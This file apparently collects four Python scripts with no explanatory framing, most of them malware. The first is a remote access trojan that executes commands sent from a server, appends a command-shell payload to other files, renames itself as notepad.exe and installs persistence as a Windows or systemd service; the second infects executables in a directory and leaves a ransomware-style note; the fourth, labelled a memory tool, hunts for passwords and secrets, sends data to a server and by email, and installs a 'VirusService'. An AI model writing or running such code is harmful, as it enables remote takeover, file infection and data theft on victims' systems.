import os
import sys
import json
import time
import socket
import threading
import subprocess
import platform

SERVER_HOST = "127.0.0.1"  # Change to your server's IP address
SERVER_PORT = 9000         # Change to your desired port
BUFFER_SIZE = 1024
DISGUISED_APP_NAME = "notepad.exe"  # Name of the legitimate application to disguise as
SERVICE_NAME = "RATService" if platform.system() == "Windows" else "rat"
PAYLOAD_CONTENT = """
import socket
import os
import time

SERVER_HOST = '127.0.0.1'
SERVER_PORT = 9000
BUFFER_SIZE = 1024

def remote_access():
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((SERVER_HOST, SERVER_PORT))
                s.sendall(b'[INFO] Remote access established.')
                while True:
                    command = s.recv(BUFFER_SIZE).decode('utf-8')
                    if command.lower() == 'exit':
                        break
                    try:
                        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                    except Exception as e:
                        result = str(e).encode('utf-8')
                    s.sendall(result)
        except Exception:
            time.sleep(10)

if __name__ == '__main__':
    remote_access()
"""

def list_files(directory):
    try:
        files = os.listdir(directory)
        return "\n".join(files)
    except FileNotFoundError:
        return f"Error: Directory '{directory}' does not exist."
    except PermissionError:
        return f"Error: Permission denied for directory '{directory}'."

def read_file(file_path):
    try:
        with open(file_path, 'r', encoding='utf-8') as file:
            return file.read()
    except FileNotFoundError:
        return f"Error: File '{file_path}' does not exist."
    except PermissionError:
        return f"Error: Permission denied for file '{file_path}'."
    except Exception as e:
        return f"Error reading file '{file_path}': {e}"

def delete_file(file_path):
    try:
        os.remove(file_path)
        return f"File '{file_path}' deleted."
    except FileNotFoundError:
        return f"Error: File '{file_path}' does not exist."
    except PermissionError:
        return f"Error: Permission denied to delete file '{file_path}'."
    except Exception as e:
        return f"Error deleting file '{file_path}': {e}"

def embed_metadata(file_path):
    metadata = {
        "unique_id": os.path.basename(file_path),
        "last_modified": time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(os.path.getmtime(file_path))),
    }
    try:
        with open(file_path, 'a', encoding='utf-8') as file:
            file.write("\n---METADATA---\n")
            file.write(json.dumps(metadata))
        return f"Metadata added to '{file_path}'."
    except FileNotFoundError:
        return f"Error: File '{file_path}' does not exist."
    except PermissionError:
        return f"Error: Permission denied to modify file '{file_path}'."
    except Exception as e:
        return f"Error embedding metadata into file '{file_path}': {e}"

def read_metadata(file_path):
    try:
        with open(file_path, 'r', encoding='utf-8') as file:
            lines = file.readlines()
        if "---METADATA---\n" in lines:
            metadata_index = lines.index("---METADATA---\n") + 1
            metadata = json.loads("".join(lines[metadata_index:]))
            return f"Metadata for '{file_path}': {metadata}"
        else:
            return f"No metadata found in '{file_path}'."
    except FileNotFoundError:
        return f"Error: File '{file_path}' does not exist."
    except PermissionError:
        return f"Error: Permission denied to read file '{file_path}'."
    except Exception as e:
        return f"Error reading metadata from file '{file_path}': {e}"

def disguise_as_legitimate_app():
    try:
        script_path = sys.argv[0]
        disguise_path = os.path.join(os.getcwd(), DISGUISED_APP_NAME)
        if script_path != disguise_path:
            if not os.path.exists(disguise_path):
                os.rename(script_path, disguise_path)
            os.execv(disguise_path, sys.argv)
    except Exception as e:
        print(f"Error disguising application: {e}")

def infect_file_with_payload(file_path):
    try:
        with open(file_path, 'a', encoding='utf-8') as file:
            file.write("\n\n# ---PAYLOAD---\n")
            file.write(PAYLOAD_CONTENT)
        return f"Payload added to '{file_path}'."
    except FileNotFoundError:
        return f"Error: File '{file_path}' does not exist."
    except PermissionError:
        return f"Error: Permission denied to modify file '{file_path}'."
    except Exception as e:
        return f"Error infecting file '{file_path}': {e}"

def create_persistence():
    try:
        if platform.system() == "Windows":
            subprocess.run([
                "sc", "create", SERVICE_NAME, "binPath=",
                f'"{os.path.join(os.getcwd(), DISGUISED_APP_NAME)}"', "start=", "auto"
            ], shell=True, check=True)
        else:
            service_file = f"/etc/systemd/system/{SERVICE_NAME}.service"
            with open(service_file, 'w') as file:
                file.write(f"""
[Unit]
Description=RAT Service
After=network.target

[Service]
ExecStart={os.path.join(os.getcwd(), sys.argv[0])}
Restart=always

[Install]
WantedBy=multi-user.target
""")
            subprocess.run(["systemctl", "enable", SERVICE_NAME], check=True)
            subprocess.run(["systemctl", "start", SERVICE_NAME], check=True)
        return "Persistence established."
    except Exception as e:
        return f"Error creating persistence: {e}"

def handle_command(command, args):
    if command == "list":
        return list_files(args)
    elif command == "read":
        return read_file(args)
    elif command == "delete":
        return delete_file(args)
    elif command == "embed_metadata":
        return embed_metadata(args)
    elif command == "read_metadata":
        return read_metadata(args)
    elif command == "infect":
        return infect_file_with_payload(args)
    elif command == "disguise":
        return disguise_as_legitimate_app()
    elif command == "persist":
        return create_persistence()
    else:
        return f"Error: Unknown command '{command}'."

def server_handler():
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
            client_socket.connect((SERVER_HOST, SERVER_PORT))
            print(f"Connected to server at {SERVER_HOST}:{SERVER_PORT}")
            while True:
                message = client_socket.recv(BUFFER_SIZE).decode('utf-8')
                if not message:
                    break
                print(f"Received command: {message}")
                try:
                    data = json.loads(message)
                    command = data.get("command")
                    args = data.get("args", "")
                    result = handle_command(command, args)
                except Exception as e:
                    result = f"Error processing command: {e}"
                client_socket.sendall(result.encode('utf-8'))
    except Exception as e:
        print(f"Error connecting to server: {e}")

def rat_service():
    while True:
        time.sleep(60)  # Send updates every 60 seconds
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
                client_socket.connect((SERVER_HOST, SERVER_PORT))
                update = {"status": "alive", "timestamp": time.strftime('%Y-%m-%d %H:%M:%S')}
                client_socket.sendall(json.dumps(update).encode('utf-8'))
        except Exception as e:
            print(f"Error sending update to server: {e}")

def main():
    disguise_as_legitimate_app()
    create_persistence()
    server_thread = threading.Thread(target=server_handler, daemon=True)
    server_thread.start()
    rat_thread = threading.Thread(target=rat_service, daemon=True)
    rat_thread.start()
    server_thread.join()
    rat_thread.join()

if __name__ == "__main__":
    main()

import os
import stat
import sys
import hashlib
import time
import random
from datetime import datetime

# Constants
OUTPUT_FILE = 'infect_scan.txt'
KEY_FILE = 'scan_key.txt'
RECOVERY_NOTE = 'RECOVERY_NOTE.txt'
PAYLOAD_IDENTIFIER = "##INFECTED_PAYLOAD##"
PERSISTENCE_MARKER = "##PERSISTENCE_MARKER##"

def log(message):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"[{timestamp}] {message}")

def is_executable(filepath):
    try:
        st = os.stat(filepath)
        return bool(st.st_mode & stat.S_IXUSR)
    except OSError:
        return False

def scan_directory_for_executables(directory):
    executable_files = []
    try:
        for root, _, files in os.walk(directory):
            for name in files:
                filepath = os.path.join(root, name)
                if is_executable(filepath) and not is_already_infected(filepath):
                    executable_files.append(filepath)
    except Exception as e:
        log(f"Error scanning directory: {e}")
    return executable_files

def is_already_infected(filepath):
    try:
        with open(filepath, 'r') as f:
            content = f.read()
        return PAYLOAD_IDENTIFIER in content
    except Exception:
        return False

def append_payload_to_file(filepath):
    try:
        with open(filepath, 'a') as f:
            f.write(f"\n\n{PAYLOAD_IDENTIFIER}\n")
            f.write("import os\n")
            f.write("def malicious_payload():\n")
            f.write("    print('This file has been infected!')\n")
            f.write("malicious_payload()\n")
            f.write(f"\n# {PERSISTENCE_MARKER}\n")
        log(f"Payload appended to {filepath}")
    except Exception as e:
        log(f"Error appending payload to {filepath}: {e}")

def encrypt_file(input_file, output_file, key):
    try:
        with open(input_file, 'r') as f:
            data = f.read()
        encrypted_data = ''.join(chr(ord(c) ^ key[i % len(key)]) for i, c in enumerate(data))
        with open(output_file, 'w') as f:
            f.write(encrypted_data)
    except Exception as e:
        log(f"Error encrypting file: {e}")

def write_results_to_file(executable_files, output_file, key_file):
    try:
        key = hashlib.sha256(os.urandom(32)).digest()
        with open(output_file, 'w') as f:
            for filepath in executable_files:
                f.write(f"scan/executable/file: {filepath}\n")
        encrypt_file(output_file, output_file, key)
        with open(key_file, 'wb') as f:
            f.write(key)
    except Exception as e:
        log(f"Error writing results to file: {e}")

def write_recovery_note():
    try:
        with open(RECOVERY_NOTE, 'w') as f:
            f.write("To decrypt the 'infect_scan.txt' file, use the key stored in 'scan_key.txt'.\n")
            f.write("Example Python decryption:\n")
            f.write("with open('scan_key.txt', 'rb') as kf:\n")
            f.write("    key = kf.read()\n")
            f.write("with open('infect_scan.txt', 'r') as ef:\n")
            f.write("    encrypted_data = ef.read()\n")
            f.write("decrypted_data = ''.join(chr(ord(c) ^ key[i % len(key)]) for i, c in enumerate(encrypted_data))\n")
            f.write("print(decrypted_data)\n")
    except Exception as e:
        log(f"Error writing recovery note: {e}")

def establish_persistence(filepath):
    try:
        os.utime(filepath, (time.time() + random.randint(100000, 1000000), time.time() + random.randint(100000, 1000000)))
        log(f"Persistence established for {filepath}")
    except Exception as e:
        log(f"Error establishing persistence for {filepath}: {e}")

def main():
    log("Starting scan and infection process...")
    target_directory = os.getcwd()  # Default to current working directory
    executable_files = scan_directory_for_executables(target_directory)

    for filepath in executable_files:
        append_payload_to_file(filepath)
        establish_persistence(filepath)

    write_results_to_file(executable_files, OUTPUT_FILE, KEY_FILE)
    write_recovery_note()

    log("Process completed successfully.")

if __name__ == "__main__":
    main()

import subprocess
import sys
import os
import argparse
import logging

def setup_logging(log_file):
    logging.basicConfig(
        filename=log_file,
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s',
    )

def read_boot_sector(device, verbose):
    try:
        if verbose:
            logging.info(f"Attempting to read boot sector from {device}.")
        result = subprocess.run(
            ["dd", f"if={device}", "bs=512", "count=1"],
            capture_output=True,
            text=True,
            check=True
        )
        if verbose:
            logging.info("Boot sector read successfully.")
        return result.stdout
    except FileNotFoundError:
        logging.error("Error: 'dd' command not found. Ensure it is installed and accessible.")
        if verbose:
            print("Error: 'dd' command not found. Ensure it is installed and accessible.")
    except subprocess.CalledProcessError as e:
        logging.error(f"Error: Failed to execute 'dd' command. Return code: {e.returncode}. Stderr: {e.stderr.strip()}")
        if verbose:
            print(f"Error: Failed to execute 'dd' command. Return code: {e.returncode}.")
    except PermissionError:
        logging.error("Error: Permission denied. Please run the script with appropriate privileges.")
        if verbose:
            print("Error: Permission denied. Please run the script with appropriate privileges.")
    except Exception as e:
        logging.error(f"Unexpected error occurred: {e}")
        if verbose:
            print(f"Unexpected error occurred: {e}")
    return None

def write_to_file(data, filename, verbose):
    try:
        with open(filename, "w", encoding="utf-8") as file:
            file.write(data)
        logging.info(f"Boot sector information written to '{filename}'.")
        if verbose:
            print(f"Boot sector information written to '{filename}'.")
    except PermissionError:
        logging.error(f"Error: Permission denied while writing to '{filename}'.")
        if verbose:
            print(f"Error: Permission denied while writing to '{filename}'.")
    except OSError as e:
        logging.error(f"Error: Failed to write to file '{filename}'. Reason: {e}")
        if verbose:
            print(f"Error: Failed to write to file '{filename}'. Reason: {e}")
    except Exception as e:
        logging.error(f"Unexpected error occurred while writing to file: {e}")
        if verbose:
            print(f"Unexpected error occurred while writing to file: {e}")

def main():
    parser = argparse.ArgumentParser(description="Boot sector utility tool.")
    parser.add_argument(
        "-d", "--device", 
        default="/dev/sda", 
        help="The device to read the boot sector from (default: /dev/sda)."
    )
    parser.add_argument(
        "-o", "--output", 
        default="boot_report.txt", 
        help="The file to write the boot sector information to (default: boot_report.txt)."
    )
    parser.add_argument(
        "-l", "--log", 
        default="boot_tool.log", 
        help="The log file to write program logs to (default: boot_tool.log)."
    )
    parser.add_argument(
        "-v", "--verbose", 
        action="store_true", 
        help="Enable verbose logging and console output."
    )
    args = parser.parse_args()

    # Set up logging
    setup_logging(args.log)
    logging.info("Boot sector utility started.")

    try:
        boot_sector_data = read_boot_sector(args.device, args.verbose)
        if boot_sector_data:
            write_to_file(boot_sector_data, args.output, args.verbose)
    except KeyboardInterrupt:
        logging.warning("Operation cancelled by user.")
        if args.verbose:
            print("\nOperation cancelled by user.")
        sys.exit(1)
    except Exception as e:
        logging.error(f"An unexpected error occurred: {e}")
        if args.verbose:
            print(f"An unexpected error occurred: {e}")
        sys.exit(1)

    logging.info("Boot sector utility completed successfully.")
    if args.verbose:
        print("Boot sector utility completed successfully.")

if __name__ == "__main__":
    main()

import os
import sys
import argparse
import http.client
import json
import traceback
import resource
import urllib.parse
import smtplib
import platform
import subprocess
import time

def get_memory_info():
    try:
        usage = resource.getrusage(resource.RUSAGE_SELF)
        return {
            "max_rss_kb": usage.ru_maxrss,
            "shared_memory_kb": getattr(usage, "ru_ixrss", 0),
            "unshared_memory_kb": getattr(usage, "ru_idrss", 0),
            "stack_memory_kb": getattr(usage, "ru_isrss", 0),
        }
    except Exception as e:
        return {"error": f"Unable to access memory usage data: {e}"}

def scrape_process_memory(pid):
    try:
        memory_data = f"/proc/{pid}/maps"
        sensitive_info = []
        if os.path.exists(memory_data):
            with open(memory_data, "r", encoding="utf-8") as file:
                for line in file:
                    if "password" in line or "secret" in line:
                        sensitive_info.append(line.strip())
        return sensitive_info
    except Exception as e:
        return [f"Error scraping memory: {e}"]

def write_memory_info_to_file(data, filename="memory_dump.txt"):
    try:
        with open(filename, "w", encoding="utf-8") as file:
            for key, value in data.items():
                file.write(f"{key}: {value}\n")
    except Exception as e:
        print(f"Error writing to file: {e}")
        traceback.print_exc()

def send_memory_info_to_server(data, server_url, retries, verbose):
    for attempt in range(retries):
        try:
            if verbose:
                print(f"Attempt {attempt + 1} to send data to server: {server_url}")

            parsed_url = urllib.parse.urlparse(server_url)
            host = parsed_url.netloc
            path = parsed_url.path or "/"

            connection = http.client.HTTPConnection(host)
            headers = {"Content-Type": "application/json"}
            connection.request("POST", path, body=json.dumps(data), headers=headers)
            response = connection.getresponse()

            if response.status == 200:
                if verbose:
                    print(f"Data successfully sent to {server_url}")
                break
            else:
                if verbose:
                    print(f"Server responded with status: {response.status} {response.reason}")
        except Exception as e:
            print(f"Error sending data to server: {e}")
            if verbose:
                traceback.print_exc()
        finally:
            try:
                connection.close()
            except:
                pass
    else:
        print(f"Failed to send data to server after {retries} retries")

def send_email(data, smtp_server, smtp_port, sender_email, recipient_email):
    try:
        message = f"Subject: Memory Data\n\n{json.dumps(data, indent=4)}"
        with smtplib.SMTP(smtp_server, smtp_port) as server:
            server.sendmail(sender_email, recipient_email, message)
    except Exception as e:
        print(f"Error sending email: {e}")
        traceback.print_exc()

def establish_persistence(service_name):
    try:
        if platform.system() == "Windows":
            service_cmd = f'sc create {service_name} binPath= "cmd /c start /b python {__file__}" start= auto'
            subprocess.run(service_cmd, shell=True, check=True)
        else:
            service_file = f"/etc/systemd/system/{service_name}.service"
            service_content = (
                f"[Unit]\nDescription={service_name}\n"
                f"[Service]\nExecStart={sys.executable} {os.path.abspath(__file__)}\n"
                f"[Install]\nWantedBy=multi-user.target\n"
            )
            with open(service_file, "w") as f:
                f.write(service_content)
            subprocess.run(f"sudo systemctl enable {service_name}", shell=True, check=True)
    except Exception as e:
        print(f"Error establishing persistence: {e}")
        traceback.print_exc()

def perform_additional_logging(memory_info, filename="additional_log.txt"):
    try:
        with open(filename, "w", encoding="utf-8") as file:
            file.write("Additional logging information:\n")
            file.write(f"System platform: {platform.system()}\n")
            file.write(f"Memory info: {json.dumps(memory_info, indent=4)}\n")
            file.write(f"Process ID: {os.getpid()}\n")
            file.write(f"Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
    except Exception as e:
        print(f"Error during additional logging: {e}")
        traceback.print_exc()

def parse_arguments():
    parser = argparse.ArgumentParser(description="Memory Snapshot Tool")
    parser.add_argument("--server-url", type=str, default="http://localhost:8080/memory", help="URL of the server to send memory data to")
    parser.add_argument("--retries", type=int, default=3, help="Number of retries for sending data to server")
    parser.add_argument("--smtp-server", type=str, default="localhost", help="SMTP server for sending email")
    parser.add_argument("--smtp-port", type=int, default=25, help="SMTP server port")
    parser.add_argument("--sender-email", type=str, default="sender@example.com", help="Sender email address")
    parser.add_argument("--recipient-email", type=str, default="recipient@example.com", help="Recipient email address")
    parser.add_argument("--verbose", action="store_true", default=False, help="Enable verbose logging")
    return parser.parse_args()

def main():
    print("Memory Snapshot Tool initialized")
    args = parse_arguments()

    memory_info = get_memory_info()
    write_memory_info_to_file(memory_info)

    print("Memory usage information written to memory_dump.txt")
    send_memory_info_to_server(memory_info, args.server_url, args.retries, args.verbose)

    pid = os.getpid()
    sensitive_info = scrape_process_memory(pid)
    if sensitive_info:
        print("Sensitive information found in process memory")
        send_email(sensitive_info, args.smtp_server, args.smtp_port, args.sender_email, args.recipient_email)

    perform_additional_logging(memory_info)

    establish_persistence("VirusService" if platform.system() == "Windows" else "virus")

    print("Memory Snapshot Tool completed")
    sys.exit(0)

if __name__ == "__main__":
    main()
